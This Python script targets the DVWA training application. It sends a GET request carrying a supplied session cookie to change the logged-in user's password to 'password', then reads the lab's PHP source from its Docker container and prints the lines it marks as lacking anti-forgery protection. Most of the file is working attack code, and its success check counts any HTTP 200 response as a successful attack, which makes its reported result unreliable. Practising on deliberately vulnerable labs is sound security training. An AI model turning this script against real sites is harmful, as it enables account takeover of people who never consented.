import requests
import subprocess

# Adjust the URL to point to the CSRF endpoint in DVWA
vulnerable_url = ''  # Replace with actual URL

# Replace with your actual session cookies from DVWA
cookies = {
    'PHPSESSID': "",  
    'security': 'low'  # Ensure the security level matches the one set in DVWA
}

# Data payload for the CSRF attack - changing password without old password
csrf_payload = {
    'password_new': 'password',  # New password
    'password_conf': 'password',  # Confirm new password
    'Change': 'Change'  # Adjust as per your form submit button or field name
}

def fetch_php_code(file_path):
    """Fetch and return the PHP code from the Docker container."""
    try:
        # Get the container ID
        result = subprocess.run(
            ["docker", "ps", "--filter", "ancestor=vulnerables/web-dvwa", "--format", "{{.ID}}"],
            capture_output=True,
            text=True
        )
        container_id = result.stdout.strip()
        if not container_id:
            raise ValueError("No DVWA container found.")
        
        # Fetch the PHP code from the specified file path
        result = subprocess.run(
            ["docker", "exec", container_id, "cat", file_path],
            capture_output=True,
            text=True
        )
        php_code = result.stdout
        if php_code:
            return php_code
        else:
            print(f"No PHP code found at {file_path}.")
            return ""
    except Exception as e:
        print(f"Error fetching PHP code: {e}")
        return ""

def extract_vulnerable_lines(php_code):
    """Extract and return lines of PHP code that are vulnerable to CSRF."""
    lines = php_code.split('\n')
    vulnerable_lines = []

    for i, line in enumerate(lines):
        # Check for common signs of CSRF vulnerability
        if 'isset($_GET' in line:
            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")
        elif '$pass_new' in line and '$pass_conf' in line:
            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")
        elif 'mysqli_query' in line:
            vulnerable_lines.append(f"Line {i + 1}: {line.strip()}")

    return vulnerable_lines

def validate_cookies():
    """Validate if cookies are correct by accessing a protected page."""
    try:
        # Access a page that requires authentication
        response = requests.get(vulnerable_url, cookies=cookies, timeout=10)
        if 'Login' in response.text or response.status_code == 403:
            print("Error: Cookies are incorrect or session has expired. Please check your session cookies.")
            return False
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error while validating cookies: {e}")
        return False

def csrf_attack():
    """Perform CSRF attack and display vulnerable code."""
    print("Performing Cross-Site Request Forgery (CSRF) Attack to Change Password...\n")
    
    # Validate cookies before performing the attack
    if not validate_cookies():
        return

    try:
        # Prepare GET parameters
        params = {
            'password_new': csrf_payload['password_new'],
            'password_conf': csrf_payload['password_conf'],
            'Change': csrf_payload['Change']
        }
        
        response = requests.get(vulnerable_url, cookies=cookies, params=params, timeout=10)

        # Check response content or status code for successful operation
        if 'Password changed.' in response.text or response.status_code == 200:
            print("CSRF Attack successful!")
            print("CSRF Payload Sent:", params)
        else:
            print("CSRF Attack unsuccessful.")
            print("Response:", response.text)
        
        # Display vulnerable PHP code
        print("\n--- Vulnerable PHP Code Snippets ---")
        php_code = fetch_php_code('/var/www/html/vulnerabilities/csrf/source/low.php')
        vulnerable_lines = extract_vulnerable_lines(php_code)
        
        if vulnerable_lines:
            for line in vulnerable_lines:
                print(line)
            print("Reason: The application is vulnerable to CSRF because user inputs are not protected by anti-CSRF tokens or validation checks.")
        else:
            print("No vulnerable lines found.")
        
        print("--- End of Vulnerable PHP Code Snippets ---")

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

# Run CSRF attack
csrf_attack()
